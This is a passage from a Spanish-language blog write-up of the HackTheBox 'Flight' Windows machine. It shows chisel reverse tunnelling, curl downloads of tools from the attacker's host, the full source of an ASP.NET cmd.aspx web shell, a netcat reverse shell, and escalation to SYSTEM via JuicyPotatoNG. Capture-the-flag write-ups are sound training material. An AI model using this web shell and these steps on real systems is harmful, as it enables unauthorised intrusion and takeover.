  TCP    0.0.0.0:47001          g0:0                   LISTENING       4	InHost      
  TCP    0.0.0.0:49664          g0:0                   LISTENING       504	InHost      
  TCP    0.0.0.0:49665          g0:0                   LISTENING       1096	InHost      
  TCP    0.0.0.0:49666          g0:0                   LISTENING       1508	InHost      
  TCP    0.0.0.0:49667          g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:49673          g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:49674          g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:49682          g0:0                   LISTENING       644	InHost      
  TCP    0.0.0.0:49694          g0:0                   LISTENING       2908	InHost      
  TCP    0.0.0.0:49723          g0:0                   LISTENING       2852	InHost      
  TCP    10.10.11.187:53        g0:0                   LISTENING       2908	InHost     
</pre></td></tr></tbody></table></code></div></div>

<blockquote>
  <p>Usando <a href="https://github.com/jpillora/chisel/releases">chisel</a> haremos port forwarding.</p>
</blockquote>

<p>En nuestra máquina ejecutamos como  server.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>❯ ./chisel server <span class="nt">--reverse</span> <span class="nt">--port</span> 9000
2023/04/06 22:30:23 server: Reverse tunnelling enabled
2023/04/06 22:30:23 server: Fingerprint <span class="nv">LGzxnAs5dUDkv0yw4j1oqcFpt3BfrUxc2Ohet8a6KWM</span><span class="o">=</span>
2023/04/06 22:30:23 server: Listening on http://0.0.0.0:9000

</pre></td></tr></tbody></table></code></div></div>
<p>Lo descargamos en Windows.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd </span>C:<span class="se">\S</span>xZkD
<span class="nb">cd </span>C:<span class="se">\S</span>xZkD
PS C:<span class="se">\S</span>xZkD&gt; curl 10.10.14.97/chisel.exe <span class="nt">-o</span> chisel.exe
curl 10.10.14.97/chisel.exe <span class="nt">-o</span> chisel.exe
PS C:<span class="se">\S</span>xZkD&gt; <span class="nb">ls
ls


    </span>Directory: C:<span class="se">\S</span>xZkD


Mode                LastWriteTime         Length Name                                                                  
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
<span class="nt">-a----</span>         4/7/2023   2:28 AM        8676864 chisel.exe                                                            
<span class="nt">-a----</span>         4/7/2023   1:06 AM          45272 nc.exe                                                                


PS C:<span class="se">\S</span>xZkD&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>En la máquina <code class="language-plaintext highlighter-rouge">Windows</code> lo ejecutamos como cliente.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\S</span>xZkD&gt; .<span class="se">\c</span>hisel.exe client 10.10.14.97:9000 R:8000:127.0.0.1:8000
.<span class="se">\c</span>hisel.exe client 10.10.14.97:9000 R:8000:127.0.0.1:8000
</pre></td></tr></tbody></table></code></div></div>
<p>No damos cuanta que la web está hecha con ASP.NET, así que podemos subir una reverse shell <code class="language-plaintext highlighter-rouge">.aspx</code>.</p>

<p>Si miramos la raiz de la carpeta veremos…..</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd</span> ../..
<span class="nb">cd</span> ../..
PS C:<span class="se">\&gt;</span> <span class="nb">ls
ls


    </span>Directory: C:<span class="se">\</span>


Mode                LastWriteTime         Length Name                                                                  
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
d-----         4/7/2023   2:07 AM                inetpub                                                               
d-----         6/7/2022   6:39 AM                PerfLogs                                                              
d-r---       10/21/2022  11:49 AM                Program Files                                                         
d-----        7/20/2021  12:23 PM                Program Files <span class="o">(</span>x86<span class="o">)</span>                                                   
d-----         4/7/2023  12:29 AM                Shared                                                                
d-----        9/22/2022  12:28 PM                StorageReports                                                        
d-----         4/7/2023   1:06 AM                SxZkD                                                                 
d-r---        9/22/2022   1:16 PM                Users                                                                 
d-----       10/21/2022  11:52 AM                Windows                                                               
d-----        9/22/2022   1:16 PM                xampp                                                                 


PS C:<span class="se">\&gt;</span> 
</pre></td></tr></tbody></table></code></div></div>
<p>La carpeta <code class="language-plaintext highlighter-rouge">inetpub</code> no es casual, veremos su contenido.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>inetpub
<span class="nb">cd </span>inetpub
PS C:<span class="se">\i</span>netpub&gt; <span class="nb">dir
dir


    </span>Directory: C:<span class="se">\i</span>netpub


Mode                LastWriteTime         Length Name                                                                  
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
d-----        9/22/2022  12:24 PM                custerr                                                               
d-----         4/7/2023   2:12 AM                development                                                           
d-----        9/22/2022   1:08 PM                <span class="nb">history                                                               
</span>d-----        9/22/2022  12:32 PM                logs                                                                  
d-----        9/22/2022  12:24 PM                temp                                                                  
d-----        9/22/2022  12:28 PM                wwwroot                                                               


PS C:<span class="se">\i</span>netpub&gt; <span class="nb">cd </span>development
<span class="nb">cd </span>development
PS C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment&gt; 
</pre></td></tr></tbody></table></code></div></div>

<p>Usando este repo crearemos nuestra <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx">cmd.aspx</a></p>
<blockquote>
  <p>Aquí te lo comparto.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre>&lt;%@ Page <span class="nv">Language</span><span class="o">=</span><span class="s2">"VB"</span> <span class="nv">Debug</span><span class="o">=</span><span class="s2">"true"</span> %&gt;
&lt;%@ import <span class="nv">Namespace</span><span class="o">=</span><span class="s2">"system.IO"</span> %&gt;
&lt;%@ import <span class="nv">Namespace</span><span class="o">=</span><span class="s2">"System.Diagnostics"</span> %&gt;

&lt;script <span class="nv">runat</span><span class="o">=</span><span class="s2">"server"</span><span class="o">&gt;</span>      
Sub RunCmd<span class="o">(</span>Src As Object, E As EventArgs<span class="o">)</span>            
  Dim myProcess As New Process<span class="o">()</span>            
  Dim myProcessStartInfo As New ProcessStartInfo<span class="o">(</span>xpath.text<span class="o">)</span>            
  myProcessStartInfo.UseShellExecute <span class="o">=</span> <span class="nb">false            
  </span>myProcessStartInfo.RedirectStandardOutput <span class="o">=</span> <span class="nb">true            
  </span>myProcess.StartInfo <span class="o">=</span> myProcessStartInfo            
  myProcessStartInfo.Arguments<span class="o">=</span>xcmd.text            
  myProcess.Start<span class="o">()</span>            
  Dim myStreamReader As StreamReader <span class="o">=</span> myProcess.StandardOutput            
  Dim myString As String <span class="o">=</span> myStreamReader.Readtoend<span class="o">()</span>            
  myProcess.Close<span class="o">()</span>            
  <span class="nv">mystring</span><span class="o">=</span>replace<span class="o">(</span>mystring,<span class="s2">"&lt;"</span>,<span class="s2">"&amp;lt;"</span><span class="o">)</span>            
  <span class="nv">mystring</span><span class="o">=</span>replace<span class="o">(</span>mystring,<span class="s2">"&gt;"</span>,<span class="s2">"&amp;gt;"</span><span class="o">)</span>            
  result.text<span class="o">=</span> vbcrlf &amp; <span class="s2">"&lt;pre&gt;"</span> &amp; mystring &amp; <span class="s2">"&lt;/pre&gt;"</span>    
End Sub
&lt;/script&gt;

&lt;html&gt;
&lt;body&gt;    
&lt;form <span class="nv">runat</span><span class="o">=</span><span class="s2">"server"</span><span class="o">&gt;</span>        
&lt;p&gt;&lt;asp:Label <span class="nb">id</span><span class="o">=</span><span class="s2">"L_p"</span> <span class="nv">runat</span><span class="o">=</span><span class="s2">"server"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"80px"</span><span class="o">&gt;</span>Program&lt;/asp:Label&gt;        
&lt;asp:TextBox <span class="nb">id</span><span class="o">=</span><span class="s2">"xpath"</span> <span class="nv">runat</span><span class="o">=</span><span class="s2">"server"</span> <span class="nv">Width</span><span class="o">=</span><span class="s2">"300px"</span><span class="o">&gt;</span>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe&lt;/asp:TextBox&gt;        
&lt;p&gt;&lt;asp:Label <span class="nb">id</span><span class="o">=</span><span class="s2">"L_a"</span> <span class="nv">runat</span><span class="o">=</span><span class="s2">"server"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"80px"</span><span class="o">&gt;</span>Arguments&lt;/asp:Label&gt;        
&lt;asp:TextBox <span class="nb">id</span><span class="o">=</span><span class="s2">"xcmd"</span> <span class="nv">runat</span><span class="o">=</span><span class="s2">"server"</span> <span class="nv">Width</span><span class="o">=</span><span class="s2">"300px"</span> <span class="nv">Text</span><span class="o">=</span><span class="s2">"/c net user"</span><span class="o">&gt;</span>/c net user&lt;/asp:TextBox&gt;        
&lt;p&gt;&lt;asp:Button <span class="nb">id</span><span class="o">=</span><span class="s2">"Button"</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">"runcmd"</span> <span class="nv">runat</span><span class="o">=</span><span class="s2">"server"</span> <span class="nv">Width</span><span class="o">=</span><span class="s2">"100px"</span> <span class="nv">Text</span><span class="o">=</span><span class="s2">"Run"</span><span class="o">&gt;</span>&lt;/asp:Button&gt;        
&lt;p&gt;&lt;asp:Label <span class="nb">id</span><span class="o">=</span><span class="s2">"result"</span> <span class="nv">runat</span><span class="o">=</span><span class="s2">"server"</span><span class="o">&gt;</span>&lt;/asp:Label&gt;       
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Lo descargamos…</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment&gt; curl 10.10.14.97/cmd.aspx <span class="nt">-o</span> cmd.aspx
curl 10.10.14.97/cmd.aspx <span class="nt">-o</span> cmd.aspx
PS C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment&gt; 
</pre></td></tr></tbody></table></code></div></div>
<p><img data-src="/assets/img/commons/Flight-writeup/6.png" alt="Hacker " class="center-image" data-proofer-ignore>
<em>CMD.aspx</em></p>

<p>Nos enviamos una shell con netcat.</p>

<p><img data-src="/assets/img/commons/Flight-writeup/7.png" alt="Hacker " class="center-image" data-proofer-ignore>
<em>Reverse Shell</em></p>

<p>Nos ponemos en escucha y nos llega la shell.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>❯ nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.97] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 53554
Windows PowerShell 
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.

PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; 
</pre></td></tr></tbody></table></code></div></div>
<p>Si listamos nuiestros privilegios veremos.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">whoami</span> /priv
<span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State   
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; 
</pre></td></tr></tbody></table></code></div></div>

<p>El privilegio <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> nos llama la atención. Usando <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a>. Lo descargamos</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\S</span>xZkD&gt; curl 10.10.14.97/JuicyPotatoNG.exe <span class="nt">-o</span> JP.exe
curl 10.10.14.97/JuicyPotatoNG.exe <span class="nt">-o</span> JP.exe
PS C:<span class="se">\S</span>xZkD&gt; 
</pre></td></tr></tbody></table></code></div></div>

<p>Cuando lo ejecutemos le decimos que nos otorgue una <code class="language-plaintext highlighter-rouge">cmd</code> y entrar en modo interactivo.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>.<span class="se">\J</span>P.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-i</span>
</pre></td></tr></tbody></table></code></div></div>
<p>¿Estan listo?</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>PS C:<span class="se">\S</span>xZkD&gt; .<span class="se">\J</span>P.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-i</span>
.<span class="se">\J</span>P.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-i</span>
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>
C:<span class="se">\&gt;</span><span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\&gt;</span>

</pre></td></tr></tbody></table></code></div></div>
<p>Procedemos a leer la flag.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
97<span class="k">****************************</span>fb

C:<span class="se">\&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>¿Qué te parecio?</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>hackthebox</a>,
      <a href='/categories/machine/'>machine</a>,
      <a href='/categories/writeup/'>writeup</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/windows/"
          class="post-tag no-text-decoration" >windows</a>
      
      <a href="/tags/hard/"
          class="post-tag no-text-decoration" >hard</a>
      
      <a href="/tags/lfi/"
          class="post-tag no-text-decoration" >lfi</a>
      
      <a href="/tags/rfi/"
          class="post-tag no-text-decoration" >rfi</a>
      
      <a href="/tags/dc/"
          class="post-tag no-text-decoration" >DC</a>
      
      <a href="/tags/virtual-hosting/"
          class="post-tag no-text-decoration" >virtual hosting</a>
      
      <a href="/tags/user-pivoting/"
          class="post-tag no-text-decoration" >user pivoting</a>
      
      <a href="/tags/runascs-exe/"
          class="post-tag no-text-decoration" >RunasCs.exe</a>
      
      <a href="/tags/juicepotatong/"
          class="post-tag no-text-decoration" >JuicePotatoNG</a>
      
      <a href="/tags/web-shell/"
          class="post-tag no-text-decoration" >web shell</a>
      
      <a href="/tags/doma/"
          class="post-tag no-text-decoration" >Doma</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        Esta entrada está licenciada bajo 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         por el autor.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Compartir</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Flight+WriteUp+-+H4ckerLite+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Ffligth-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Flight+WriteUp+-+H4ckerLite+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Ffligth-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Ffligth-writeup%2F&text=Flight+WriteUp+-+H4ckerLite+%7C+Blog" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copiar enlace"
        data-title-succeed="¡Enlace copiado!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Actualizado recientemente</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/inject-writeup/">Inject WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/escape-writeup/">Escape WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/broscience-writeup/">BroScience WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/metatwo-writeup/">MetaTwo WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/photobomb-writeup/">Photobomb WriteUp</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
    
      
      <a class="post-tag" href="/tags/medium/">medium</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
    
      
      <a class="post-tag" href="/tags/dc/">DC</a>
    
      
      <a class="post-tag" href="/tags/windows/">windows</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Lecturas adicionales</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/escape-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1680451200"
    data-df="YYYY-MM-DD"
    >
  2023-04-02
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Escape WriteUp</h3>
            <div class="text-muted small">
              <p>
                





